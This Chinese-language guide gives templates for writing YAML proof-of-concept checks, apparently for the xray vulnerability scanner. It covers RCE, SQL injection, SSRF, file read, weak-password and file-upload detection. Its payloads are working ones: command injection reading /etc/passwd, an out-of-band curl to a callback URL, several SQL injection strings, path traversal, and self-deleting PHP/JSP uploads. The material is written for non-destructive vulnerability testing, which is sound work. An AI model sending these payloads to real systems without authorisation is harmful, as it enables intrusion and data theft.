# POC编写模板
## HTTP
### 常规正则匹配规范
#### 文件类
```yaml
- /etc/passwd
	- "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
- c:/windows/win.ini
  - response.body_string.contains("for 16-bit app support")
```
#### 命令类（原则上，在不能使用expr等操作时才可使用以下命令进行证明）
```yaml
- id
  - "(u|g)id=\\d+".matches(response.body_string) && response.body_string.contains("root")
  - 注意，该匹配方式不能单独使用，请结合其他信息一起使用(例如上述的root)，例如添加headers中的特殊信息，或者前一个规则比较强等
- ls
  - 使用该命令一般是在IOT环境下，确认ls的目录中某些文件不会发生变动的情况下，可以匹配返回的文件名称
- rev
  - echo {{randstr}} | rev
  - response.body_string.contains(rev(randstr))
```
### 常规漏洞检测模版
#### RCE类
##### 常规RCE
###### 代码执行
```yaml
name: poc-yaml-test-php-rce
manual: true
transport: http
set:
    s1: randomInt(100000, 200000)
    s2: randomInt(10000, 20000)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /index.php
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: <?={{s1}}-{{s2}};
        expression: response.status == 200 && response.body_string.contains(string(s1 - s2))
expression: r0()
detail:
    author: test
    links:
        - https://test.com
```
在随机数过小的情况下，可能还是会出现误报，所以，请在适当的时候，活用bstartsWith方法。
例如，计算的结果直接返回，并无其他附加，那么这个时候就可以使用`response.body.bstartsWith(bytes(string(s1 - s2)))`
```yaml
name: poc-yaml-test-jsp-rce
manual: true
transport: http
set:
    s1: randomInt(100000, 200000)
    s2: randomInt(100000, 200000)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /test
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: script=Java.type('java.lang.Runtime').getRuntime().exec("expr {{s1}} + {{s2}}").getInputStream()
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains(string(s1 + s2))
expression: r0()
detail:
    author: test
    links:
        - https://test.com
```
###### 命令执行
```yaml
name: poc-yaml-test-rce
manual: true
transport: http
set:
    s1: randomInt(100000, 200000)
    s2: randomInt(10000, 20000)
rules:
    # windows的情况
    r0:
        request:
            cache: true
            method: POST
            path: /test
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                id=set /A {{s1}}-{{s2}}
        expression: response.status == 200 && response.body_string.contains(string(s1 - s2))
    r1:
        request:
            cache: true
            method: POST
            path: /test2
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                id=type c:/windows/win.ini
        expression: response.status == 200 && response.body_string.contains("for 16-bit app support")
    # linux的情况
    r2:
        request:
            cache: true
            method: POST
            path: /test
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                id=expr {{s1}} - {{s2}}
        expression: response.status == 200 && response.body_string.contains(string(s1 - s2))
    r3:
        request:
            cache: true
            method: POST
            path: /test
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                id=echo {{s1}}-{{s2}}|bc
        expression: response.status == 200 && response.body_string.contains(string(s1 - s2))
    r4:
        request:
            cache: true
            method: POST
            path: /test1
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                id=cat /etc/passwd
        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
expression: r0() || r1() || r2() || r3() || r4()
detail:
    author: test
    links:
        - http://test.com
```
##### 无回显RCE
```yaml
name: poc-yaml-test
manual: true
transport: http
set:
    reverse: newReverse()
    reverseURL: reverse.url
    reverseDomain: reverse.domain
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /run
            body: test=ls|curl+{{reverseURL}}
        expression: reverse.wait(5)
    r1:
        request:
            cache: true
            method: POST
            path: /run
            body: test=ls|ping+reverseDomain
        expression: reverse.wait(5)
expression: r0() || r1()
detail:
    author: test
    links:
        - http://test.com
```
#### SQL注入类
##### 普通注入
```yaml
name: poc-yaml-test-sqli
manual: true
transport: http
set:
    s1: randomInt(100000, 200000)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /index.jsp?id=1%27%20union%20select%20md5({{s1}})
            follow_redirects: true
        expression: response.body_string.contains(substr(md5(string(s1)), 2, 28))
expression: r0()
detail:
    author: test
    links:
        - https://www.test.com
```
##### 报错注入
```yaml
name: poc-yaml-test-sqli
manual: true
transport: http
set:
    s1: randomInt(100000, 200000)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /index.jsp?id=1%27%20and%20updatexml(1,concat(0x7e,(select%20md5({{s1}})),0x7e),1)--
            follow_redirects: true
        expression: response.body_string.contains(substr(md5(string(s1)), 2, 28))
expression: r0()
detail:
    author: test
    links:
        - https://www.test.com
```
##### 布尔盲注
```yaml
name: poc-yaml-test
manual: true
transport: http
set:
    s1: randomLowercase(5)
    a1: randomInt(10000, 100000)
    a2: randomInt(10000, 100000)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /test
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: id=aaa%27 and {{a1}}={{a2}} and %27{{s1}}%27=%27{{s1}}
            follow_redirects: true
        expression: response.body_string.contains("User authentication Failed")
    r1:
        request:
            cache: true
            method: POST
            path: /test
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: id=aaa%27 and {{a1}}={{a1}} and %27{{s1}}%27=%27{{s1}}
            follow_redirects: true
        expression: response.body_string.contains("User Login Failed for XXXXXX User")
expression: r0() && r1()
detail:
    author: test
    links:
        - https://www.test.com
```
##### 时间盲注
```yaml
name: poc-yaml-test-sqli
manual: true
transport: http
set:
    sleepSecond: randomInt(5, 8)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /user/test.php?id=1%27)%20AND%20(SELECT(SELECT(SLEEP(0))))%23
        expression: 'true'
        output:
            r0latency: response.latency
    r1:
        request:
            cache: true
            method: GET
            path: /user/test.php?id=1%27)%20AND%20(SELECT(SELECT(SLEEP({{sleepSecond}}))))%23
        expression: response.latency - r0latency >= sleepSecond * 1000 - 1000
expression: r0() && r1()
detail:
    author: test
    links:
        - http://test.com
```
#### SSRF/URL跳转类
目前暂时推荐使用example.com/example.org，后续会支持配置文件中动态获取
以下为具体示例，在不影响验证的情况下，推荐使用r0规则进行验证（URL跳转）
**ps**：在使用r0规则时，有两点需要注意：

1. 当存在多次跳转的情况时，请不要使用该规则
2. 当location中包含原本请求的url时，请谨慎使用该规则，可能导致验证失败
```yaml
name: poc-yaml-test-url
manual: true
transport: http
set:
    randomUrl: |
        "http://" + randomLowercase(6) + ".com"
    reverse: newReverse()
    reverseUrl: reverse.url
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /user/test.php?url={{randomUrl}}
            follow_redirects: false
        expression: response.status < 400 && response.status >= 300 && response.headers["Location"].contains(randomUrl)
    r1:
        request:
            cache: true
            method: GET
            path: /user/test.php?url=example.com
            follow_redirects: true
        expression: response.status == 200 && response.body_string.contains("<title>Example Domain</title>") && response.body_string.contains("<h1>Example Domain</h1>")
    # 仅在SSRF访问不到外面的情况下使用反连进行测试
    r2:
        request:
            cache: true
            method: GET
            path: /user/test.php?url={{reverseUrl}}
        expression: response.status == 200 && reverse.wait(3)
expression: r0() || r1() || r2()
detail:
    author: test
    links:
        - http://test.com
```
#### 文件读取类
##### 系统文件
```yaml
name: poc-yaml-test
manual: true
transport: http
rules:
    linux:
        request:
            cache: true
            method: GET
            path: /test/../../../../etc/passwd
        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
    windows:
        request:
            cache: true
            method: GET
            path: /test/../../../../Windows/win.ini
        expression: response.status == 200 && response.body_string.contains("for 16-bit app support")
expression: linux() || windows()
detail:
    author: test
    links:
        - https://www.test.com
```
##### 网站配置文件
```yaml
name: poc-yaml-test
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /test.aspx?filePath=../../web.config
            follow_redirects: true
        expression: response.body_string.contains("<add key=\"MyServerIP\"") && response.body_string.contains("<add name=\"ConnectionString\" connectionString=\"") && response.body_string.contains("<sessionState mode=\"InProc\"")
expression: r0()
detail:
    author: test
    links:
        - https://www.test.com
```
#### 未授权类
```yaml
name: poc-yaml-test-unauth
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /admin/
        expression: response.status == 200 && response.body_string.contains("<title>Admin</title>") && response.body_string.contains("<h2>DController</h2>")
expression: r0()
detail:
    author: test
    links:
        - https://www.test.com
```
#### 弱口令类
```yaml
name: poc-yaml-test
manual: true
transport: http
payloads:
  continue: false
  payloads:
    p1:
      username: |
        "kevinaaa"
      password: |
        "kevinbbb"
    p2:
      username: |
        "developeraaa"
      password: |
        "developerbbb"
rules:
  r1:
    request:
      method: POST
      path: /http/index.php
      follow_redirects: false
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: requester=login&username={{username}}&input_passwd={{password}}
    expression: response.status == 200 && "{(.*)result['\"]\\s*:\\s*true(.*)}".bmatches(response.body)
expression: r1()
detail:
  author: test
  links:
    - https://www.test.com
```
### 难以无害化漏洞检测模版
#### 文件删除
此类漏洞建议使用版本匹配的方式，或者匹配其他特征的方式侧面验证漏洞的存在，不要直接执行删除请求，以防对测试目标造成损害。
#### 文件修改
此类漏洞建议使用版本匹配的方式，或者匹配其他特征的方式侧面验证漏洞的存在，不要直接执行删除请求，以防对测试目标造成损害。
#### 文件上传

- `multipart/form-data; boundary=---------------------------16314487820932200903769468567`中的boundary应随机化
- 在上传的文件不能删除的情况下，可以选择继续上传一个同名空文件（请确保上传后的文件名称不被重命名），将原来的文件内容进行覆盖。
- 但常规情况下，在上传php，jsp文件时，可以使用一些函数来将上传的文件删除，示例如下：
```yaml
name: poc-yaml-test
manual: true
transport: http
set:
    r1: randomLowercase(20)
    r2: randomLowercase(20)
    rboundary: randomLowercase(8)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /test
            headers:
                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
            body: |-
                ------WebKitFormBoundary{{rboundary}}
                Content-Disposition: form-data; name="file-upload"; filename="{{r1}}.php"
                Content-Type: application/octet-stream

                <?php echo "{{r2}}"; unlink(__FILE__); ?>
                ------WebKitFormBoundary{{rboundary}}--
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains(r1)
        output:
            search: '"(?P<tmp>.+?)".bsubmatch(response.body)'
            tmp: search["tmp"]
    r1:
        request:
            cache: true
            method: GET
            path: /test/{{tmp}}/{{r1}}.php
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains(r2)
expression: r0() && r1()
detail:
    author: test
    links:
        - https://test.com
```
```yaml
name: poc-yaml-wanhuoa-upload-rce
manual: true
transport: http
set:
    rfilename: randomLowercase(4)
    s1: randomInt(40000, 44800)
    s2: randomInt(40000, 44800)
    rboundary: randomLowercase(8)
rules:
    r1:
        request:
            method: POST
            path: /test
            headers:
                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
            body: "\
									------WebKitFormBoundary{{rboundary}}\r\n\
                  Content-Disposition: form-data; name=\"file\"; filename=\"{{rfilename}}.jsp\"\r\n\
                  Content-Type: application/octet-stream\r\n\
                  \r\n\
                  <%out.print({{s1}} * {{s2}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n\
                  ------WebKitFormBoundary{{rboundary}}--\r\n\
                  "
        expression: response.status == 200 && response.body_string.contains("success")
        output:
            search: |
                "\"data\":\"(?P<filename>\\d+).jsp\"".bsubmatch(response.body)
            uploadfilename: search["filename"]
    r2:
        request:
            method: GET
            path: /test/{{uploadfilename}}.jsp
        expression: response.status == 200 && response.body_string.contains(string(s1 * s2))
expression: r1() && r2()
detail:
    author: test
    links:
        - https://test.com
```
#### 账号/密码修改
此类漏洞建议使用版本匹配的方式，或者匹配其他特征的方式侧面验证漏洞的存在，不要直接执行删除请求，以防对测试目标造成损害。
### 特殊漏洞检测
#### 文件读取后，返回内容被编码
```yaml
name: poc-yaml-test
manual: true
transport: http
rules:
  r0:
    request:
      cache: true
      method: POST
      path: /test
      headers:
        Content-Type: application/xml
      body: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><methodCall>\r\n<methodName>WorkflowService.getAttachment</methodName>\r\n<params><param><value><string>/etc/passwd</string>\r\n</value></param></params></methodCall>"
    expression: response.status == 200 && "root:[x*]:0:0:".matches(base64Decode("<base64>(?P<base64>.*)</base64>".bsubmatch(response.body)["base64"]))
expression: r0()
detail:
  author: test
  links:
    - https://www.test.com
```
#### Mssql unicode编码字符串
```yaml
name: poc-yaml-test
manual: true
transport: http
set:
  rs: randomLowercase(20)
rules:
  r0:
  	request:
      method: GET
      path: /?sql=select UPPER('{{rs}}')
  	expression:
      response.body_string.contains(upper(rs))
expression: r0()
detail:
  author: test
  links:
    - https://www.test.com
```
## TCP

### POC

#### 常规服务漏洞

##### memcache未授权访问漏洞

```yaml=
name: poc-yaml-test
manual: false
transport: tcp
rules:
  r0:
    request:
      content: "stats"
      read_timeout: "3"
    expression: response.raw.bcontains(b"STAT pid") && response.raw.bcontains(b"STAT version")
    output:
      version: '"STAT version (?P<version>[\\d\\.]+)".bsubmatch(response.raw)["version"]'
      host: response.conn.destination.addr
expression: r0()
detail:
  author: test
  fingerprint:
    infos:
      - name: "memcache"
        version: "{{version}}"
    host_info:
      hostname: "{{host}}"
```

#### 需要建立多个TCP连接进行验证的漏洞

可能类似这样的漏洞：CVE-2016-8704

参考连接：https://talosintelligence.com/vulnerability_reports/TALOS-2016-0219/